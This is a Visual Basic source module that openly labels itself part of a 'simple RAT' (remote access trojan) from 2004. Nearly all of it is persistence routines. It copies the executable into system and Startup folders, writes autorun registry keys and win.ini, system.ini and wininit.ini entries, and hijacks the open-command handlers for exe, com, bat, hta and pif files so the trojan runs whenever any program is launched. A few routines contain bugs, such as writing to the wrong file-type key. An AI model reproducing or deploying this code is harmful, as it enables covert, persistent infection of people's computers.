Attribute VB_Name = "StartUp"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'




Function mfncGetFromIni(strSectionHeader As String, strVariableName As String, strFileName As String) As String
Dim strReturn As String
strReturn = String(255, Chr(0))
mfncGetFromIni = Left$(strReturn, GetPrivateProfileString(strSectionHeader, ByVal strVariableName, "", strReturn, Len(strReturn), strFileName))
End Function

Function mfncWriteIni(strSectionHeader As String, strVariableName As String, strValue As String, strFileName As String) As Integer
    mfncWriteIni = WritePrivateProfileString(strSectionHeader, strVariableName, strValue, strFileName)
End Function

Function WindowsDir() As String
Dim WindirS As String * 255
Dim Temp
Dim Result
Temp = GetWindowsDirectory(WindirS, 255)
Result = Left(WindirS, Temp)
WindowsDir = Result
End Function

Public Sub RegRunService(Path As String, Keyname As String)
'Ex: RegRun "C:/MyProgram.exe", "MyProgram"
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICES\" & Keyname, Path
End Sub

Public Sub RemoveRegRunService(Keyname As String)
'Ex: RemoveRegRunService "MyProgram"
Dim Reg As Object
Set Reg = CreateObject("Wscript.Shell")
Reg.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICES\" & Keyname
End Sub

Public Sub RegRun(Path As String, Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & Keyname, Path
End Sub

Public Sub RemoveRegRun(Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("Wscript.Shell")
Reg.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & Keyname
End Sub

Public Sub RegRunOnce(Path As String, Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE\" & Keyname, Path
End Sub

Public Sub RemoveRegRunOnce(Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("Wscript.Shell")
Reg.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE\" & Keyname
End Sub

Public Sub RegRunOnceEX(Path As String, Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCEEX\" & Keyname, Path
End Sub

Public Sub RemoveRegRunOnceEX(Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("Wscript.Shell")
Reg.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCEEX\" & Keyname
End Sub

Public Sub RegRunServiceOnce(Path As String, Keyname As String)

Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICESONCE\" & Keyname, Path
End Sub

Public Sub RemoveRegRunServiceOnce(Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("Wscript.Shell")
Reg.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICESONCE\" & Keyname
End Sub

Public Sub RegRunServiceOnceEX(Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
FileCopy App.Path & "/" & App.EXEName & ".exe", "C:/Windows/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICESONCEEX\000x\" & Keyname, "||" & App.EXEName & ".exe"
End Sub

Public Sub RemoveRegRunServiceOnceEX(Keyname As String)
Dim Reg As Object
Set Reg = CreateObject("Wscript.Shell")
Kill "C:/Windows/" & App.EXEName & ".exe"
Reg.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICESONCEEX\000x\" & Keyname
End Sub

Public Sub WinINIRun(Path As String)
mfncWriteIni "windows", "run", Path, WindowsDir & "/win.ini"
End Sub

Public Sub RemoveWinINIRun()
mfncWriteIni "windows", "run", "", WindowsDir & "/win.ini"
End Sub

Public Sub WinINILoad(Path As String)
mfncWriteIni "windows", "load", Path, WindowsDir & "/win.ini"
End Sub

Public Sub RemoveWinINILoad()
mfncWriteIni "windows", "load", "", WindowsDir & "/win.ini"
End Sub

Public Sub StartFolder(Path As String)
FileCopy Path, WindowsDir & "/Start Menu/Programs/StartUp/" & App.EXEName & ".exe"
End Sub

Public Sub RemoveStartFolder()
Kill WindowsDir & "/Start Menu/Programs/StartUp/" & App.EXEName & ".exe"
End Sub

Public Sub SystemINI()
FileCopy App.Path & "/" & App.EXEName & ".exe", WindowsDir & "/" & App.EXEName & ".exe"
mfncWriteIni "boot", "shell", "Explorer.exe " & App.EXEName & ".exe", WindowsDir & "/system.ini"
End Sub

Public Sub RemoveSystemINI()
mfncWriteIni "boot", "shell", "Explorer.exe", WindowsDir & "/" & "system.ini"
End Sub

Public Sub WininitINI(Path As String)
FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
mfncWriteIni "rename", "nul", App.EXEName & ".exe", WindowsDir & "/wininit.ini"
End Sub

Public Sub RemoveWininitINI()
mfncWriteIni "rename", "nul", "", WindowsDir & "wininit.ini"
End Sub
 
Public Sub RegRootExeSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegRootExeSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegRootComSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_CLASSES_ROOT\comfile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegRootComSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_CLASSES_ROOT\comfile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegRootBatSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_CLASSES_ROOT\batfile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegRootBatSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_CLASSES_ROOT\batfile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegRootHtaSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_CLASSES_ROOT\htafile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegRootHtaSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_CLASSES_ROOT\htafile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegRootPifSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_CLASSES_ROOT\piffile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegRootPifSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_CLASSES_ROOT\piffile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegMachineExeSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\exefile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegMachineExeSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\exefile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegMachineComSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\comfile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegMachineComSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\batfile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegMachineBatSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\batfile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegMachineBatSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\batfile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegMachineHtaSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\htafile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegMachineHtaSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\htafile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RegMachinePifSpawn(Path As String)
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

FileCopy Path, WindowsDir & "/" & App.EXEName & ".exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\piffile\shell\open\command\", App.EXEName & ".exe " & Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub RemoveRegMachinePifSpawn()
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")

Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\piffile\shell\open\command\", Chr(34) & Chr(37) & Chr(49) & Chr(34) & Chr(32) & Chr(37) & Chr(42)
End Sub

Public Sub IosubsysFolder()
FileCopy Path, WindowsDir & "/System/Iosubsys/" & App.EXEName & ".exe"
End Sub

Public Sub RemoveIosubsysFolder()
Kill WindowsDir & "/System/Iosubsys/" & App.EXEName & ".exe"
End Sub
